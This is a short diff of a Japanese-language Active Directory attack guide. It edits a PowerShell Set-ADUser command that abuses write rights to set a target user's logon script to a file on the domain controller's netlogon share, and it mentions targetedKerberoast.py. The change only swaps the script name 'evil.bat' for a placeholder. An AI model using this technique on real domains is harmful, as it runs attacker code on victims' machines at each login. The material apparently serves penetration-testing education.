@@ -39,7 +39,7 @@ python3 targetedKerberoast.py -v \
 
 ターゲットがログインするたびにスクリプトが実行される：
 ```powershell
-Set-ADUser -Identity [TARGET_USER] -ScriptPath '\\[DC]\netlogon\evil.bat'
+Set-ADUser -Identity [TARGET_USER] -ScriptPath '\\[DC]\netlogon\[script_name].bat'
 ```
 
 ### ケース2: グループオブジェクトへの GenericWrite
